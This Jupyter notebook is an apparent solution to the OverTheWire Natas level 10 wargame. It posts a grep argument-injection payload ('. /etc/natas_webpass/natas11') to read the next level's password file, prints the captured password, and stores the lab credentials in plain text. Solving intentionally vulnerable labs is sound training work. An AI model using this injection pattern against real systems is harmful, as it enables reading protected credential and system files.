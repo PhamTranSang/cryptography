{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK\n"
     ]
    }
   ],
   "source": [
    "import requests\n",
    "import re\n",
    "\n",
    "username = 'natas10'\n",
    "password = 'nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu'\n",
    "url = 'http://%s.natas.labs.overthewire.org' % username\n",
    "\n",
    "payload = {'needle': '. \\/etc\\/natas_webpass\\/natas11', 'submit': 'Search'}\n",
    "\n",
    "session = requests.Session()\n",
    "\n",
    "response = session.post(url, data=payload, auth=(username, password))\n",
    "\n",
    "content = response.text\n",
    "\n",
    "flag = re.findall('<pre>\\n/etc/natas_webpass/natas11:(.*?)\\n', content)[0]\n",
    "\n",
    "print(flag)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "password lv9->lv10: nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.8.5"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
